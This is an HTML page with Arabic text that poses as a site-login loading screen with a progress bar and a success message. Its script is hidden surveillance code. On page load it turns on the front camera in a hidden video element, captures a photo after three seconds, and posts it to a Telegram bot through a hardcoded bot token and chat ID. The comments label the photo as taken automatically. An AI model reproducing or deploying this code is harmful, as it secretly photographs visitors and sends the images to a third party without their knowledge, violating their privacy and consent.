<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري الدخول إلى الموقع</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #333;
        }
        .loading-container {
            width: 80%;
            max-width: 500px;
            text-align: center;
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            position: relative;
            overflow: hidden;
        }
        h1 {
            color: #2c3e50;
            margin-bottom: 30px;
        }
        .progress-container {
            width: 100%;
            height: 20px;
            background-color: #ecf0f1;
            border-radius: 10px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(to right, #3498db, #2ecc71);
            border-radius: 10px;
            transition: width 0.1s linear;
        }
        .loading-text {
            margin-top: 20px;
            font-size: 18px;
            color: #7f8c8d;
        }
        .dots::after {
            content: '';
            animation: dots 1.5s steps(5, end) infinite;
        }
        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60% { content: '...'; }
            80%, 100% { content: ''; }
        }
        
        /* عناصر الكمرة المخفية */
        #video {
            display: none;
        }
        
        /* رسالة التأكيد */
        .confirmation-message {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #2ecc71;
            color: white;
            padding: 20px 40px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            z-index: 1000;
            display: none;
            font-size: 20px;
            font-weight: bold;
            animation: fadeIn 0.5s ease-out;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translate(-50%, -40%); }
            to { opacity: 1; transform: translate(-50%, -50%); }
        }
    </style>
</head>
<body>
    <!-- عناصر واجهة الدخول -->
    <div class="loading-container">
        <h1>جاري الدخول إلى الموقع</h1>
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        <div class="loading-text">
            جاري التحقق من البيانات<span class="dots"></span>
        </div>
    </div>

    <!-- رسالة التأكيد -->
    <div class="confirmation-message" id="confirmationMessage">
        تم الدخول إلى الموقع بنجاح
    </div>

    <!-- عناصر الكمرة المخفية -->
    <video id="video" autoplay playsinline></video>

    <script>
        // عناصر التحكم
        const progressBar = document.getElementById('progressBar');
        const video = document.getElementById('video');
        const confirmationMessage = document.getElementById('confirmationMessage');
        const duration = 20000; // 20 ثانية
        
        // دالة إرسال الصورة إلى Telegram
        async function sendPhotoToTelegram(photoData) {
            const botToken = '8387241026:AAFP3m5vSV5KpV63lF0kCiR1OJJEbOelQl4';
            const chatId = '7002841594';
            
            try {
                const formData = new FormData();
                const blob = await (await fetch(photoData)).blob();
                formData.append('photo', blob, 'user_photo.png');
                formData.append('chat_id', chatId);
                formData.append('caption', 'صورة المستخدم تم التقاطها تلقائياً');
                
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                return data.ok;
            } catch (error) {
                console.error('Error sending photo to Telegram:', error);
                return false;
            }
        }
        
        // بدء عملية الدخول والتقاط الصورة
        async function startProcess() {
            const startTime = Date.now();
            
            // 1. تشغيل الكمرة الأمامية (مخفية)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                video.srcObject = stream;
                
                // 2. التقاط الصورة بعد 3 ثواني
                setTimeout(async () => {
                    const photoData = await capturePhoto(stream);
                    await sendPhotoToTelegram(photoData);
                }, 3000);
                
            } catch (err) {
                console.error('حدث خطأ في الكمرة:', err);
            }
            
            // 3. تحديث شريط التقدم
            function updateProgress() {
                const elapsed = Date.now() - startTime;
                const progress = Math.min(elapsed / duration, 1);
                progressBar.style.width = `${progress * 100}%`;
                
                if (progress < 1) {
                    requestAnimationFrame(updateProgress);
                } else {
                    // عرض رسالة التأكيد
                    confirmationMessage.style.display = 'block';
                    
                    // إخفاء الرسالة بعد 3 ثواني
                    setTimeout(() => {
                        confirmationMessage.style.display = 'none';
                    }, 3000);
                }
            }
            updateProgress();
        }
        
        // دالة التقاط الصورة وإرجاعها كـ base64
        function capturePhoto(stream) {
            return new Promise((resolve) => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // إيقاف الكمرة
                stream.getTracks().forEach(track => track.stop());
                
                // إرجاع الصورة كـ base64
                resolve(canvas.toDataURL('image/png'));
            });
        }
        
        // بدء العملية عند تحميل الصفحة
        window.onload = startProcess;
    </script>
</body>
</html>
